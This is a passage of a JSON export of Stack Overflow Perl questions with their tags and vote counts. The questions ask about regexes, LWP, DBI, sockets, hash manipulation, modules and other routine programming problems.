</p>\n"},{"tags":["perl","search-engine","bing"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12692934,"title":"Perl Bing::Search Module and APPID","body":"<p>I want to use my Perl Script to connect to Bing Search Engine and use a keyword to get search results and use them in my script.</p>\n\n<p>I tried getting the Bing Developer's APPID however, all the old links do not work.</p>\n\n<p>I am planning to use the <a href=\"http://search.cpan.org/~dhouston/Bing-Search-1.120270/lib/Bing/Search.pm\" rel=\"nofollow\">Bing::Search</a> Perl Module from CPAN:</p>\n\n<h3>Question #1:</h3>\n\n<p>Is this module still good to be used with the Bing Search API?</p>\n\n<p>In the CPAN Documentation it says we need to get the APPID from:</p>\n\n<blockquote>\n  <p><a href=\"http://www.bing.com/developers/createapp.aspx\" rel=\"nofollow\">http://www.bing.com/developers/createapp.aspx</a></p>\n</blockquote>\n\n<p>Documentation seems to be a bit outdated.</p>\n\n<p>So, I came across <a href=\"http://www.bing.com/community/site_blogs/b/developer/archive/2012/05/17/bing-developer-update-2.aspx\" rel=\"nofollow\">this article</a>, and it appears that some changes have been made recently and now we need to sign up at azure marketplace.</p>\n\n<h3>Question #2:</h3>\n\n<p>Is the above Perl Module still good for Bing Search Engine?</p>\n\n<p><strong>Update:</strong> I just registered on the Azure Data Marketplace and now they have provided me an AccountKey. I am not sure if it is the same as the APPID.</p>\n\n<p>Also, I have subscribed to \"Bing Search API â Web Results Only\".</p>\n\n<p>Now, it gives me options to explore the dataset.</p>\n\n<p>I cannot use it with Perl Scripts?</p>\n\n<p>Thanks.</p>\n"},{"tags":["regex","perl","awk","backslash","eol"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12692701,"title":"Multi platform script perl or awk","body":"<p>I am trying to match records in following format:</p>\n\n<pre><code>(-,username,domain1.co.uk)\\\n(-,username,domain2.co.uk)\n</code></pre>\n\n<p>either awk or perl must be used. I am using cygwin and wrote following code which works and matches both above entries:</p>\n\n<pre><code>awk 'BEGIN {musr=\"(-,username,[^)]+.co.uk)\"} {if ($0~musr) print $0}' netgroup\n</code></pre>\n\n<p>But if I try to modify this regexp to be more specific the output is nothing:</p>\n\n<p>1st: match record then last backslash and then match newline:</p>\n\n<pre><code>\"(-,username,[^)]+.co.uk)\\\\$\"\n</code></pre>\n\n<p>2nd: match new line immediatelly after record without backslash:</p>\n\n<pre><code>\"(-,username,[^)]+.co.uk)$\"\n</code></pre>\n\n<p>So I decided to rewrite script into perl, hoping that perl can deal with backslashes and end of line symbols. For this purpose I used a2p this way:</p>\n\n<pre><code>echo  'BEGIN {musr=\"(-,username,[^)]+.co.uk)\"} {if ($0~musr) print $0}' | a2p.exe \n#!/usr/bin/perl\neval 'exec /usr/bin/perl -S $0 ${1+\"$@\"}'\n    if $running_under_some_shell;\n                        # this emulates #! processing on NIH machines.\n                        # (remove #! line above if indigestible)\n\neval '$'.$1.'$2;' while $ARGV[0] =~ /^([A-Za-z_0-9]+=)(.*)/ &amp;&amp; shift;\n                        # process any FOO=bar switches\n\n$, = ' ';               # set output field separator\n$\\ = \"\\n\";              # set output record separator\n\n$musr = '(-,username,[^)]+.co.uk)';\n\nwhile (&lt;&gt;) {\n    chomp;      # strip record separator\n    if ($_ =~ $musr) {\n        print $_;\n    }\n}\n</code></pre>\n\n<p>This generated perl script also matches both entries, however if I try modify this script to more specific I get the following errors:</p>\n\n<p>1st:</p>\n\n<pre><code>$musr = \"(-,username,[^)]+.co.uk)\\\\\";\nTrailing \\ in regex m/(-,username,[^)]+.co.uk)\\/ at perlmatch.pl line 18, &lt;&gt; line 1.\n</code></pre>\n\n<p>2nd:</p>\n\n<pre><code>$musr = \"(-,username,[^)]+.co.uk)$\";\nFinal $ should be \\$ or $name at perlmatch.pl line 14, within string\nsyntax error at perlmatch.pl line 14, near \"= \"(-,username,[^)]+.co.uk)$\"\"\nExecution of perlmatch.pl aborted due to compilation errors.\n</code></pre>\n\n<p>3rd:</p>\n\n<pre><code>$musr = \"(-,username,[^)]+.co.uk)\\$\";\n[the output is nothing]\n</code></pre>\n\n<p>What I am doing wrong ? My question is also pointing to fact that if somebody needs to use script on several platforms (aix, solaris, linux) than using perl should be better approach that dealing with (non)GNU utils and various (g|n)awk versions etc. Regards</p>\n"},{"tags":["perl","phonegap","in-app-purchase"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12642102,"title":"Verif Receipt with perl script","body":"<p>I have to use a perl Script to interface to verifReceipt for in App Purchase on iOS.\nI use too phoneGap 1.5.0</p>\n\n<p>1/ When I try to use external url it does not work.\n2/ I try to use a perl script interface between phonegap html page and itunes.\nI do not understand how to send data. I try this :</p>\n\n<pre><code>$val contains JSON object with receiptvalue and password, receiving from phonegap.\n\nmy %transformfields = (\n            \"receipt-data\"       =&gt; $val,\n            );\n\nmy $ua = LWP::UserAgent-&gt;new;\n\nmy $req = POST($urlsend,\n    Content_Type =&gt; 'application/json ; charset=UTF-8',\n    Content =&gt; \\%transformfields,\n    #Content =&gt; $val,\n    );\n\n\n\nmy $res = $ua-&gt;request($req);\n</code></pre>\n\n<p>I have always this error : 21002 java.lang.NullPointerException\nI do not understand how is this possible to send data with perl script.</p>\n"},{"tags":["perl","search","hash","delete","structure"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":12674418,"title":"Perl: Compare and edit underlying structure in hash","body":"<p>I have a hash of complex structure and I want to perform a search and replace. The first hash is like the following:</p>\n\n<pre><code>$VAR1 = {\n  abc =&gt; { 123 =&gt; [\"xx\", \"yy\", \"zy\"], 456 =&gt; [\"ab\", \"cd\", \"ef\"] },\n  def =&gt; { 659 =&gt; [\"wx\", \"yg\", \"kl\"], 456 =&gt; [\"as\", \"sd\", \"df\"] },\n  mno =&gt; { 987 =&gt; [\"lk\", \"dm\", \"sd\"] },\n}\n</code></pre>\n\n<p>and I want to iteratively search for all '123'/'456' elements, and if a match is found, I need to do a comparison of the sublayer, i.e. of <code>['ab','cd','ef']</code> and <code>['as','sd','df']</code> and in this case, keep only the one with ['ab','cd','ef']. So the output will be as follows:</p>\n\n<pre><code>$VAR1 = {\n  abc =&gt; { 123 =&gt; [\"xx\", \"yy\", \"zy\"], 456 =&gt; [\"ab\", \"cd\", \"ef\"] },\n  def =&gt; { 659 =&gt; [\"wx\", \"yg\", \"kl\"] },\n  mno =&gt; { 987 =&gt; [\"lk\", \"dm\", \"sd\"] },\n}\n</code></pre>\n\n<p>So the deletion is based on the substructure, and not index. How can it be done? Thanks for the help!!</p>\n\n<p>Lets assume that I will declare the values to be kept, i.e. I will keep 456 => [\"ab\", \"cd\", \"ef\"] based on a predeclared value of [\"ab\", \"cd\", \"ef\"] and delete any other instance of 456 anywhere else. The search has to be for every key. so the code will go through the hash, first taking 123 => [\"xx\", \"yy\", \"zy\"] and compare it against the keys throughout the rest of the hash, if no match is found, do nothing. If a match is found, like in the case of 456 => [\"ab\", \"cd\", \"ef\"], it will compare the two, and as I have said that in case of a match the one with [\"ab\", \"cd\", \"ef\"] would be kept, it will keep 456 => [\"ab\", \"cd\", \"ef\"] and discard any other instances of 456 anywhere else in the hash, i.e. it will delete 456 => [\"as\", \"sd\", \"df\"] in this case. </p>\n"},{"tags":["perl","input"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":44,"score":-2,"question_id":12687782,"title":"Getting another website data to manipulate its value in Perl","body":"<pre><code>use CGI qw(:standard);\nuse CGI::Carp qw(fatalsToBrowser warningsToBrowser);\nour @a=param(src=\"http://fxrates.forexpros.com/index.php?pairs_ids=1525=last_update\");\nprint header(),start_html('results.pl');\n$a=http://fxrates.forexpros.com/index.php?pairs_ids=1525=last_update;\n'&lt;iframe frameborder=\"0\" scrolling=\"no\" height=\"95\" width=\"213\"         allowtransparency=\"true\" marginwidth=\"0\" marginheight=\"0\" src=\"http://fxrates.forexpros.com/index.php?pairs_ids=1525;&amp;header-text-color=%23FFFFFF&amp;curr-name-color=%230059b0&amp;inner-text-color=%23000000&amp;green-text-color=%232A8215&amp;green-background=%23B7F4C2&amp;red-text-color=%23DC0001&amp;red-background=%23FFE2E2&amp;inner-border-color=%23CBCBCB&amp;border-color=%23cbcbcb&amp;bg1=%23F6F6F6&amp;bg2=%23ffffff&amp;bid=hide&amp;ask=hide&amp;last=hide&amp;high=hide&amp;low=hide&amp;change=hide&amp;change_in_percents=hide&amp;last_update=show\"&gt;&lt;/iframe&gt;&lt;br /&gt;&lt;div style=\"width:213\"&gt;&lt;span style=\"float:left\"&gt;&lt;span style=\"font-size: 11px;color: #333333;text-decoration: none;\"&gt;The &lt;a href=\"http://www.forexpros.com/quotes\" target=\"_blank\" style=\"font-size: 11px;color: #06529D; font-weight: bold;\" class=\"underline_link\"&gt;Forex Quotes&lt;/a&gt; are Powered by Forexpros - The Leading Financial Portal.&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;';\n\n  print '&lt;br/&gt;';\n  print \"$a\";\n  print end_html();'\n</code></pre>\n\n<p>getting error:</p>\n\n<blockquote>\n  <p>Can't modify constant item in scalar assignment at livedata.pl line 4, near \"\"http://fxrates.forexpros.com/index.php?pairs_ids=1525=last_update\")\" syntax error at livedata.pl line 6, near \"http:\" Execution of livedata.pl aborted due to compilation errors.</p>\n</blockquote>\n"},{"tags":["perl","perl-module"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12615067,"title":"Getting error \"Can't locate HTML/TreeBuilder/XPath.pm in @INC \"","body":"<p>Gettin below error while running my perl file </p>\n\n<p><code>Can't locate HTML/TreeBuilder/XPath.pm in @INC (@INC contains: C:/Perl/lib C:/Pe\nrl/site/lib .) at display.pl line 4.\nBEGIN failed--compilation aborted at display.pl line 4.</code></p>\n\n<p>HTML::TreeBuilder::XPath module(0.14) is installed. From command line when i run command </p>\n\n<pre><code> perl -e HTML::TreeBuilder::XPath it doesn't give any error.\n</code></pre>\n\n<p>when i run from command line perldoc -l HTML::TreeBuilder::XPath gives below error:</p>\n\n<pre><code>No documentation found for \"HTML::TreeBuilder::XPath\".\n</code></pre>\n\n<p>My perl version is 5.8.7</p>\n"},{"tags":["perl","string","oop","methods","symbols"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":246,"score":5,"question_id":2719246,"title":"In Perl, how can I call a method whose name I have in a string?","body":"<p>I'm trying to write some abstract code for searching through a list of similar objects for the first one whose attributes match specific values. In order to do this, I need to call a bunch of accessor methods and check all their values one by one. I'd like to use an abstraction like this:</p>\n\n<pre><code>sub verify_attribute {\n    my ($object, $attribute_method, $wanted_value) = @_;\n    if ( call_method($object, $attribute_method) ~~ $wanted_value ) {\n        return 1;\n    }\n    else {\n        return;\n    }\n}\n</code></pre>\n\n<p>Then I can loop through a hash whose keys are accessor method names and whose values are the values I'm looking for for those attributes. For example, if that hash is called <code>%wanted</code>, I might use code like this to find the object I want:</p>\n\n<pre><code>my $found_object;\nFINDOBJ: foreach my $obj (@list_of_objects) {\n    foreach my $accessor (keys %wanted) {\n        next FINDOBJ unless verify_attribute($obj, $accessor, $wanted{$accessor});\n    }\n    # All attrs verified\n    $found_object = $obj;\n    last FINDOBJ;\n}\n</code></pre>\n\n<p>Of course, the only problem is that <code>call_method</code> does not exsit. Or does it? How can I call a method if I have a string containing its name? Or is there a better solution to this whole problem?</p>\n"},{"tags":["windows","perl","ipv6"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":108,"score":2,"question_id":11348206,"title":"perl windows IPv6","body":"<p>I have a Perl/Windows app that uses TCP/IP sockets and I need to add IPv6 support.</p>\n\n<p>I have a Windows 7 64-bit machine that is running IPv6 with a Hurricane Electric tunnel and it scores 10 out 10 on <a href=\"http://test-ipv6.com/\" rel=\"nofollow\">http://test-ipv6.com/</a> and will access IPv6-only sites such as <a href=\"http://loopsofzen.co.uk/\" rel=\"nofollow\">http://loopsofzen.co.uk/</a>.</p>\n\n<p>It has ActivePerl 5.14.2 (I also tried Strawberry Perl 5.16.0.1).</p>\n\n<p>Here's a simple test script:</p>\n\n<pre><code>use Socket qw( getaddrinfo );\n$host = 'loopsofzen.co.uk';\n$port = 80;\n$hints = (socktype =&gt; SOCK_STREAM, family -&gt; Socket::AF_INET6);\n($err, @addrs) = getaddrinfo($host, 0);\ndie $err if $err;\n</code></pre>\n\n<p>and this produces the error:</p>\n\n<p>\"no address associated with nodename at ip.pl line 6.\"</p>\n\n<p>The (new) getaddrinfo() function appears to be available and it does work if I set $host to use an IPv4 hostname. But IPv6 doesn't appear to work at all.</p>\n\n<p>What am I missing? Or is Perl/Windows/IPv6 still a lost cause for the time being?</p>\n"},{"tags":["python","perl","mechanize","lwp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12686624,"title":"Perl::Mechanize - how to loop through a set of pages","body":"<p>good day dear community, </p>\n\n<p>i am heading for Perl-programming. I want to learn something. Well i am currently working on a small solution: I have tried various tutorials (examples of Mechanize - that i have found on the CPAN) not oll of them work - some of them are broken!</p>\n\n<p>Now i try t o get some real-world-task!</p>\n\n<p>Especially interesting for me as a PHP/Perl-beginner </p>\n\n<p>i have approximatley 10000 pages to parse</p>\n\n<p>See what i have found out -  that the logic behind this search page:\n<a href=\"http://katholisch.at/content/site/pfarrfinder/address/5307.html%20katholisch.at/content/site/pfarrfinder/address/5303.html\" rel=\"nofollow\">this search page </a></p>\n\n<p>is the following the pages are organized like they are organized like that: </p>\n\n<p>they are organized like that: </p>\n\n<pre><code>http://Www.address/5307.html\nhttp://Www.address/5308.html\nhttp://Www.address/5309.html\n</code></pre>\n\n<p>Approach: to loop through a set of pages - that is the question: what i have so far: </p>\n\n<p>i want to take WWW::Mechanize - particularly for doing the form based search and selecting the individual entries.</p>\n\n<p>Hmm - i guess that the algorithm would be basically 2 nested loops: the outer loop runs the form based search, the inner loop processes the search results.</p>\n\n<pre><code>$mech-&gt;follow_link(url_regex =&gt; qr/webgrab_path=http://evs2000.*?\nId=d+$/, n =&gt; $result_nbr); \n</code></pre>\n\n<p>well i  guess that perl is as suitable as Python is. Isnt it?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":61,"score":0,"question_id":12687468,"title":"what are upcoming/current new techonology in perl will be used in enterprise applications","body":"<p>I have want to keep update the latest techonology and understand and learn the new tech in perl which used in enterprise applications ?</p>\n"},{"tags":["perl","memory-leaks","lwp"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12681857,"title":"Memory leak with Perl's LWP using HTTPS","body":"<p>I think I found a memory leak with LWP when connecting via HTTPS.  With the following script, memory usage increases constantly:</p>\n\n<pre><code>use LWP::UserAgent;\n\n$ua = LWP::UserAgent-&gt;new();\n$request = HTTP::Request-&gt;new(GET=&gt;'https://www.google.com/');\nwhile (1) {\n  $response = $ua-&gt;request($request);\n  sleep(1);\n}\n</code></pre>\n\n<p>This other script has no problems:</p>\n\n<pre><code>use LWP::UserAgent;\n\n$ua = LWP::UserAgent-&gt;new();\n$request = HTTP::Request-&gt;new(GET=&gt;'http://www.google.com/'); # https =&gt; http\nwhile (1) {\n  $response = $ua-&gt;request($request);\n  sleep(1);\n}\n</code></pre>\n\n<p>Perl 5.12.3 / LWP 5.837 / Crypt 0.58 / Mac OS X 10.7.4</p>\n\n<p>Does anyone know a way around this?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":994,"score":1,"question_id":4204078,"title":"Perl scripts, to use forks or threads?","body":"<p>I am writing a couple fo scripts that go and collect data from a number of servers, the number will grow and im trynig to future proof my scripts, but im a little stuck.</p>\n\n<p>so to start off with I have a script that looks up an IP in a mysql database and then connects to each server grabs some information and then puts it into the database again.</p>\n\n<p>What i have been thinknig is there is a limited amount of time to do this and if i have 100 servers it will take a little bit of time to go out to each server get the information and then push it to a db. So I have thought about either using forks or threads in perl?</p>\n\n<p>Which would be the prefered option in my situation? And hs anyone got any examples?</p>\n\n<p>Thanks!</p>\n\n<p>Edit: Ok so a bit more inforamtion needed: Im running on Linux, and what I thought was i could get the master script to collect the db information, then send off each sub process / task to connect and gather information then push teh information back to the db.</p>\n"},{"tags":["php","mysql","perl","mutual-exclusion"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":42,"score":0,"question_id":12685029,"title":"PHP Mutual Exclusion on a File / MySQL reading and executing statements from a file using perl","body":"<p>So I was wondering how / if PHP has some sort of mutual exclusion on file reading and writing.</p>\n\n<p>Here's how I plan on using it:</p>\n\n<p>The site I'm working with utilizes a payment service that requires leaving the server, making it difficult to deal with form submissions, such that the form does not get submitted into the database until after returning from the payment service. Information CAN be passed through the payment service and regurgitated on the other end. However, there is minimum information that can be passed.</p>\n\n<p>My idea of a solution:</p>\n\n<p>Before a registration is passed to the payment service, process and write the sql statements in a file, with each group of statements referring to a registration separated by some token. </p>\n\n<p>On returning find the entry based on the information you sent through the payment service, execute the statements and remove the registration block from the file.</p>\n\n<p>Rephrasing the question:</p>\n\n<p>-So the question is - in this scenario would I need mutual exclusion on the file, and if so how would I achieve it? Could this be locked from multiple languages? (The payment service requires returning to a cgi / perl script - although I could include a php script that actually processes)</p>\n\n<p>-How would I run through and execute the SQL statements (preferably in perl)?</p>\n\n<p>-Does my solution even seem like a good one?</p>\n\n<p>Thanks,</p>\n\n<p>Travis</p>\n"},{"tags":["perl","variables","multiple","equals","plus"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":87,"score":2,"question_id":12684074,"title":"Perform multiple += in one line of Perl","body":"<p>In Perl it is possible to instantiate multiple variables like so:</p>\n\n<pre><code>my ($a, $b, $c) = (1,2,3);\n</code></pre>\n\n<p>It is also possible to reassign multiple variable values the same way:</p>\n\n<pre><code>($a, $b, $c) = (4,5,6);\n</code></pre>\n\n<p>However, when I try to do the same thing with the plus equals operator,</p>\n\n<pre><code>($a, $b, $c) += (7,8,9);\n</code></pre>\n\n<p>only <code>$c</code> is properly added and the other variables remain their original value.  Is this something that should be possible in Perl, or is it just partially working by accident and it really doesn't work that way?  If the latter is true, is there a way to to this in one line?</p>\n"},{"tags":["perl","apache","apache2","mod-perl","apache2-module"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12679122,"title":"Is Apache::Request (old perl/apache) the same as HTTP::Request (new perl/Apache)?","body":"<p>Hello Perl warriors.  </p>\n\n<p>I'm totally new to the language and have been placed on a interesting project of porting an application that was originally written for Apache 1.3 (and the older Perl), to RHEL / CentOS 6 with Apache 2.2.x and mod_perl.</p>\n\n<p>As for calling in lib's:</p>\n\n<p>is</p>\n\n<p>Apache::Request (old perl/apache) the same as HTTP::Request (Apache2, mod_perl)?</p>\n\n<p>Additionally, if anyone has any resources they have found to be particularly useful during a perl upgrade / porting project, it would be greatly appreciated.</p>\n"},{"tags":["python","xml","perl","ivy"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12682295,"title":"changing rev value in ivy.xml using perl/python","body":"<p>Need to change rev=\"{rev}\" in ivy.xml dynamically right before the build. I was trying to use Perl XML:Simple module but the output was not acceptable. In the dependencies section, I'm getting:\n<br></p>\n\n<pre><code>&lt;dependencies name=\"dependency\"&gt;\n  &lt;poi org=\"ossjava\" rev=\"3.6.0\" /&gt;\n&lt;/dependencies&gt;\n</code></pre>\n\n<p>instea of </p>\n\n<pre><code>&lt;dependencies&gt;\n       &lt;dependency org=\"ossjava\" name=\"poi\" rev=\"3.6.0\"/&gt;\n&lt;/dependencies&gt;\n</code></pre>\n\n<p>Please help! A Python code snippet will also suffice</p>\n"},{"tags":["perl","forex","metatrader4"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":148,"score":0,"question_id":11458870,"title":"Metatrader TCP via perl","body":"<p>Looking for the simplest possible example of how to communicate with Metatrader client via its TCP stack using perl.</p>\n\n<pre><code>{perl} --[client_TCP_api]--&gt; {MT_client} --[server_API]--&gt; metatrader_server\n</code></pre>\n\n<p><a href=\"http://stackoverflow.com/q/7753069/632407\">Here</a> is an question looking for a [server_API]. I'm looking for a [client_API] that is completely different and it is publicly available.</p>\n\n<p>Only my experiments don't work. Unfortunately, this question is answerable only by person who know metatrader and perl together.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12681450,"title":"rmtree perl: Find and delete svn directory recurvisely","body":"<p>I tried deleting the svn directory recursively through :</p>\n\n<pre><code>system(\"rm -rf `find . -type d -name .svn\");\n</code></pre>\n\n<p>But I want to do the same using perl module rmtree(obtained in File::Path). Please guide me how can it be done?</p>\n"},{"tags":["regex","perl","unicode","encoding"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":12680767,"title":"Perl regex matching on large unicode codepoints","body":"<p>I am trying to replace various characters with a either a single quote or double quote</p>\n\n<p>here is my test file</p>\n\n<pre><code># replace all with double quotes\nï¼ fullwidth\nâ left\nâ right\nâ low\n\" normal\n\n# replace all with single quotes\n' normal\nâ left\nâ right\nâ low\nâ reverse\n` backtick\n</code></pre>\n\n<p>I'm trying to do this...</p>\n\n<pre><code>perl -Mutf8 -pi -e \"s/[\\x{2018}\\x{201A}\\x{201B}\\x{FF07}\\x{2019}\\x{60}]/'/ug\" test.txt\nperl -Mutf8 -pi -e 's/[\\x{FF02}\\x{201C}\\x{201D}\\x{201E}]/\"/ug' text.txt\n</code></pre>\n\n<p>but only the backtick character gets replaced properly.  I think it has something to do with the other codepoints being too large, but i cannot find any documentation on this.</p>\n\n<p>Here i have a oneliner which dumps the unicode code points, to verify they match my regex.</p>\n\n<pre><code>$ awk -F\\  '{print $1}' test.txt | \\\n    perl -C7 -ne 'for(split(//)){print sprintf(\"U+%04X\", ord).\" \".$_.\"\\n\"}'\n\nU+FF02 ï¼\nU+201C â\nU+201D â\nU+201E â\nU+0022 \"\n\nU+0027 '\nU+2018 â\nU+2019 â\nU+201A â\nU+201B â\nU+0060 `\n</code></pre>\n\n<p>why isn't my regex matching?</p>\n"},{"tags":["mysql","perl","dbi"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":12679035,"title":"Getting the max row character length in a query using Perl DBI Mysql","body":"<p>Using: Perl v5.10.1, MySQL 5.5.15, DBI.</p>\n\n<p>I need to deliver end users output from a database via email.  They do not want this as an attachment, but in the body.</p>\n\n<p>I'd like to deliver the data in an ascii table and am having issues determining if DBI has built in functions to do this (output similar to querying MySQL from the command line).  </p>\n\n<p>Or If I can determine the longest row character length I can use that to build the table.  I have a way to get the max item length in an array, but I can't wrap my head around doing it with the query results.</p>\n\n<pre><code>my $spacer_length = (reverse sort { $a &lt;=&gt; $b } map { length($_) } @array)[0];\n</code></pre>\n"},{"tags":["perl","script","code-coverage","pod"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":94,"score":6,"question_id":12584743,"title":"Perl POD coverage for scripts and tests (not modules)","body":"<p>Is there a way to measure POD coverage for scripts (e.g. <code>*.pl</code>)?</p>\n\n<p>I can measure documentation coverage for <em>packages</em> using <code>Pod::Coverage</code> and <code>Test::Pod::Coverage</code>, but I cannot measure it for <em>scripts</em>, because <code>Pod::Coverage</code> and the underlying <code>Devel::Symdump</code> use <code>require</code> to inspect the content of the package, which fails due to the lack of a <code>.pm</code> file.</p>\n\n<p>Is there a way to work around this?</p>\n\n<p>(I have to have POD documentation in the <code>.pl</code> files, so moving everything into a module and documenting it there is not a good solution for me. Wherever I could do that, it's already done that way.)</p>\n"},{"tags":["arrays","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":169,"score":5,"question_id":12679019,"title":"Why does perl not allow me to dereference a member of a hash reference into an array?","body":"<p>Perl terms confuse me and it's not my native language, so bear with me.  I'll try to use the right terms, but I'll give an example just to make sure.</p>\n\n<p>So I have a hash reference in the variable $foo.  Lets say that $foo->{'bar'}->{'baz'} is an array reference.  That is I can get the first member of the array by assigning $foo->{'bar'}->{'baz'}->[0] to a scalar.</p>\n\n<p>when I do this:</p>\n\n<pre><code>foreach (@$foo-&gt;{'bar'}-&gt;{'baz'})\n{\n    #some code that deals with $_\n}\n</code></pre>\n\n<p>I get the error \"Not an ARRAY reference at script.pl line 41\"</p>\n\n<p>But when I do this it works:</p>\n\n<pre><code>$myarr = $foo-&gt;{'bar'}-&gt;{'baz'};\nforeach (@$myarr)\n{\n    #some code that deals with $_\n}\n</code></pre>\n\n<p>Is there something I'm not understanding?  Is there a way I can get the first example to work?  I tried wrapping the expression in parentheses with the @ on the outside, but that didn't work.  Thanks ahead of time for the help.</p>\n"},{"tags":["perl","subroutine","typeglob"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":73,"score":3,"question_id":12670455,"title":"How can I prevent a sub being overwritten in Perl?","body":"<p>I'm working with legacy code and have to <code>require</code> a .pl file that defines a sub <code>foo</code>. My problem is that in my <code>main::</code> namespace there already is another sub <code>foo</code>, which is called later in a part of the program I'm currently not dealing with.</p>\n\n<p>The file I require defines <code>sub foo {}</code> because obviously it does not want the foo things to happen where it is usually called. In my case, that is bad.</p>\n\n<p>I've tried playing around with the <code>*foo</code> glob:</p>\n\n<pre><code>*old_foo = *foo;\nrequire 'foo_killer.pl';\n*foo = *old_foo;\n</code></pre>\n\n<p>Of course, that doesn't work since I've only created an alias (as brian d foy points out on page 133 of <em>Mastering Perl</em>) and thus <code>*old_foo</code> will point to the now 'empty' subroutine.</p>\n\n<p>Is there a way to somehow copy what's in <code>*foo{CODE}</code> to somewhere else instead of aliasing it? Or is there maybe another approach to solve this?</p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":91,"score":2,"question_id":12677627,"title":"Regex to extract Query String","body":"<p>I'm relatively new to regular expressions and could use some help. Can someone provide a regex (I'm using Perl) to extract a query string from a URL? I have tried the following but get an empty string:</p>\n\n<pre><code>my $string = 'http://www.google.com?queryArg1=1&amp;queryArg2=2';\n$string =~ s/^(.*)?//;\n</code></pre>\n\n<p>Ideally this example would provide the following string: queryArg1=1&amp;queryArg2=2</p>\n\n<p>More awesome if you could turn this into a hash:</p>\n\n<pre><code>my $hash = {queryArg1 =&gt; 1,\n            queryArg2 =&gt; 2};\n</code></pre>\n\n<p>Thanks for your help!</p>\n"},{"tags":["mysql","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":12650738,"title":"Perl + POO and Mysql error","body":"<p>I just learned poo and i got to play with perl, achieved this but I do not get the expected output, problem with mysql? Or bad code?. other thing, the same query runs on console and workbench, and this module add chmod +x module.pm</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict; \nuse DBI;\nuse DBD::mysql;\npackage MysqlTest;\n\nsub new{\n    my $class = shift;\n    my $query={};\n    bless($query, $class);\n}\nsub conexion{\n    my $self=shift;\n    my($database, $host, $user, $pwd)=@_;\n    my $connect = DBI-&gt;connect(\"DBI:mysql:$database:$host\", $user, $pwd) or die $DBI::errstr;;\n    $self-&gt;{\"host\"}=\"$host\";\n    $self-&gt;{\"database\"}=\"$database\";\n    $self-&gt;{\"user\"}=\"$user\";\n    $self-&gt;{\"pass\"}=\"$pwd\";\n    my $mysqlopen = 1;\nreturn;\n}\nsub consulta{\n    my $self=shift;\n    if (!$mysqlopen) { &amp;conexion; }\n    my $id = \"SELECT * FROM save_bookmarks WHERE id='123'\";\n    $result = $connect-&gt;prepare($id);\n    $result-&gt;execute();\n    my @resultado = $result-&gt;fetchrow_array();\n    print \"@resultado\\n\";\n    return;\n}\nsub datos{\n    my $self=shift;\n    print \"::DATOS DE ACCESO::\\n\";\n    while (($key, $value)=each(%$self)){\n        print \"$key =&gt; $value\\n\";\n    }\n}\n1;\n</code></pre>\n\n<p>this file called method and created object. add to chmod  +x file.pl , but i don't know, whats not work? </p>\n\n<pre><code>#!/usr/bin/perl\n\nuse MysqlTest;\nuse warnings;\nuse strict;\n\nmy $mysqltest = MysqlTest-&gt;new();\n$mysqltest-&gt;conexion(\"bookmarks\", \"localhost\", \"root\", \"pass\");\n$mysqltest-&gt;consulta();\n</code></pre>\n\n<p>output in console</p>\n\n<pre><code>DBI connect(':','',...) failed: Access denied for user 'delkav'@'localhost' (using password: NO) at MysqlTest.pm line 17.\nAccess denied for user 'delkav'@'localhost' (using password: NO) at MysqlTest.pm line 17.\n</code></pre>\n\n<p>any idea?</p>\n"},{"tags":["perl","exit","subroutine"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":172,"score":6,"question_id":12606646,"title":"In Perl is there a way to restart the program currently running from within itself?","body":"<p>I am running a program in Perl that at one point evaluates data in an if statement called from within a subroutine, e.g. </p>\n\n<pre><code>sub check_good {\n    if (!good) {\n         # exit this subroutine\n         # restart program\n    } \n    else {\n         # keep going\n    }\n} # end sub\n</code></pre>\n\n<p>The problem I have is with exiting and restarting. I know that I can just use <code>exit 0;</code> to exit straight out, but obviously this is not correct if I want to go back to the beginning. I tried calling the subroutine which essentially starts the program, but of course once it has run it will go back to this point again.\nI thought about putting it in a while loop, but this would mean putting the whole file in the loop and it would be very impractical. 